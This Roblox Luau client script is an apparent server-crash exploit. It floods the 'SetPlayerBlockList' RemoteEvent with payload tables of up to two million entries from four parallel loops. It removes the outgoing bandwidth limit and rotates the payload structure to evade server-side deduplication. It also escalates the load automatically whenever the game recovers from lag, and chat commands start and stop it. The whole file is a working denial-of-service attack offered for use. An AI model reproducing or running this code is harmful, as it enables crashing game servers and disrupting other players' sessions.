--!nonstrict
local Players = game:GetService("Players")
local TextChatService = game:GetService("TextChatService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

-- ═══════════ CONFIG ═══════════
local CONFIG = {
    baseChildren      = 150000,
    maxChildren       = 2000000,
    baseFireBurst     = 1.5,
    maxFireBurst      = 12,
    baseFrameDelay    = 0.125,
    minFrameDelay     = 0.02,
    parallelLoops     = 4,
    checkEvery        = 2,      -- seconds between lag checks
    lagMultiplier     = 1.5,    -- > this × baseline = "lagging"
    calmChecks        = 3,      -- consecutive "not lagging" checks before escalating
    escalateEvery     = 5,      -- minimum seconds between escalations
    refreshRemoteEvery = 10,
    rebuildEvery      = 20,
    watchdogEvery     = 3,
    stallTimeout      = 5,
}

local RemoteCandidates = {
    { "RobloxReplicatedStorage", "SetPlayerBlockList" },
    { "ReplicatedStorage",       "SetPlayerBlockList" },
}
-- ══════════════════════════════

local state = {
    running     = false,
    children    = CONFIG.baseChildren,
    fireBurst   = CONFIG.baseFireBurst,
    frameDelay  = CONFIG.baseFrameDelay,
    remote      = nil,
    cache       = nil,
    loops       = {},
    fires       = 0,
    lastFire    = 0,
    escalations = 0,
}

-- ═══════════ FRAME-TIME DETECTION ═══════════
local frameTimes = {}
local baselineFT = nil

RunService.Heartbeat:Connect(function(dt)
    frameTimes[#frameTimes + 1] = dt
    if #frameTimes > 60 then table.remove(frameTimes, 1) end
    if not baselineFT or dt < baselineFT then
        baselineFT = math.max(dt, 0.005)
    end
end)

local function avgFT()
    if #frameTimes == 0 then return 1/60 end
    local sum = 0
    for i = 1, #frameTimes do sum = sum + frameTimes[i] end
    return sum / #frameTimes
end

local function isLagging()
    if not baselineFT then return true end
    return avgFT() > baselineFT * CONFIG.lagMultiplier
end

-- ═══════════ REMOTE + PAYLOAD ═══════════
local function resolve()
    for _, path in ipairs(RemoteCandidates) do
        local node, ok = game, true
        for i = 1, #path do
            local nxt = node:FindFirstChild(path[i])
            if not nxt then ok = false; break end
            node = nxt
        end
        if ok and node and (node:IsA("RemoteEvent") or node:IsA("UnreliableRemoteEvent")) then
            return node
        end
    end
    return nil
end

pcall(function()
    game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
end)

-- Rotate payload structure to break server-side dedup/caching
local variant = 0

local function build()
    variant = (variant + 1) % 3
    local n = state.children
    local root = table.create(n)

    if variant == 0 then
        for i = 1, n do root[i] = { id = i, v = i * 2, t = "a" } end
    elseif variant == 1 then
        for i = 1, n do root[i] = { i, i * 2, "b", true } end
    else
        for i = 1, n do root[i] = { k = i, w = i * 3, tag = "c", flag = false } end
    end
    return root
end

-- ═══════════ FIRE LOOPS (parallel) ═══════════
local function spawnLoop()
    return task.spawn(function()
        while state.running do
            if not state.remote then
                state.remote = resolve()
            end
            if state.remote and state.cache then
                pcall(function()
                    for _ = 1, state.fireBurst do
                        state.remote:FireServer(state.cache)
                    end
                end)
                state.fires += 1
                state.lastFire = tick()
            end
            task.wait(state.frameDelay)
        end
    end)
end

local function killLoops()
    for _, t in ipairs(state.loops) do pcall(task.cancel, t) end
    state.loops = {}
end

local function ensureLoops()
    local alive = 0
    for _, t in ipairs(state.loops) do
        local ok, st = pcall(coroutine.status, t)
        if ok and st ~= "dead" then alive += 1 end
    end
    while alive < CONFIG.parallelLoops do
        table.insert(state.loops, spawnLoop())
        alive += 1
    end
end

-- ═══════════ ESCALATION ═══════════
local function escalate()
    state.children  = math.min(math.floor(state.children * 1.3), CONFIG.maxChildren)
    state.fireBurst = math.min(state.fireBurst + 1, CONFIG.maxFireBurst)
    state.frameDelay = math.max(state.frameDelay * 0.85, CONFIG.minFrameDelay)
    state.cache = build()
    state.remote = nil
    state.escalations += 1
    print(string.format("[CRASH] ESCALATE #%d → children=%d burst=%.1f delay=%.3f",
        state.escalations, state.children, state.fireBurst, state.frameDelay))
end

-- ═══════════ MONITORS ═══════════

-- 1. Detect "un-lag" and re-trigger
task.spawn(function()
    local lastEsc = 0
    local calm = 0
    while true do
        task.wait(CONFIG.checkEvery)
        if state.running then
            if isLagging() then
                calm = 0
            else
                calm += 1
                if calm >= CONFIG.calmChecks and (tick() - lastEsc) > CONFIG.escalateEvery then
                    calm = 0
                    lastEsc = tick()
                    escalate()
                end
            end
        else
            calm = 0
        end
    end
end)

-- 2. Force remote re-resolve periodically (picks up replaced remotes)
task.spawn(function()
    while true do
        task.wait(CONFIG.refreshRemoteEvery)
        if state.running then state.remote = nil end
    end
end)

-- 3. Rebuild payload periodically (new tables, new variant)
task.spawn(function()
    while true do
        task.wait(CONFIG.rebuildEvery)
        if state.running then state.cache = build() end
    end
end)

-- 4. Loop watchdog — respawns dead loops, detects stalls
task.spawn(function()
    while true do
        task.wait(CONFIG.watchdogEvery)
        if state.running then
            if (tick() - state.lastFire) > CONFIG.stallTimeout then
                print("[CRASH] stall detected — respawning all loops")
                killLoops()
                state.remote = nil
                state.lastFire = tick()
            end
            ensureLoops()
        end
    end
end)

-- 5. Telemetry so you can see what's happening (F9)
task.spawn(function()
    local lastFires = 0
    while true do
        task.wait(10)
        if state.running then
            local delta = state.fires - lastFires
            lastFires = state.fires
            print(string.format(
                "[CRASH] fires=%d (+%d/10s) | FT=%.3f (base=%.3f) | lagging=%s | escalations=%d | children=%d",
                state.fires, delta, avgFT(), baselineFT or 0.016,
                isLagging() and "yes" or "NO", state.escalations, state.children
            ))
        else
            lastFires = state.fires
        end
    end
end)

-- ═══════════ START / STOP ═══════════
local function start()
    if state.running then return end
    state.running = true
    state.children = CONFIG.baseChildren
    state.fireBurst = CONFIG.baseFireBurst
    state.frameDelay = CONFIG.baseFrameDelay
    state.cache = build()
    state.remote = nil
    state.fires = 0
    state.lastFire = tick()
    state.escalations = 0
    ensureLoops()
    print("[CRASH] STARTED — will auto-escalate whenever the game un-lags")
end

local function stop()
    if not state.running then return end
    state.running = false
    killLoops()
    state.cache = nil
    state.remote = nil
    print("[CRASH] STOPPED")
end

-- ═══════════ CHAT ═══════════
local started = false

local function onMessage(msg)
    local m = tostring(msg or ""):lower():gsub("^%s+", ""):gsub("%s+$", "")
    if m == "!start" then
        if not started then
            started = true
            pcall(start)
        end
    elseif m == "!stop" then
        if started then
            started = false
            pcall(stop)
        end
    end
end

pcall(function() player.Chatted:Connect(onMessage) end)
pcall(function()
    TextChatService.MessageReceived:Connect(function(message)
        if not message.TextSource then return end
        if message.TextSource.UserId ~= player.UserId then return end
        onMessage(message.Text)
    end)
end)
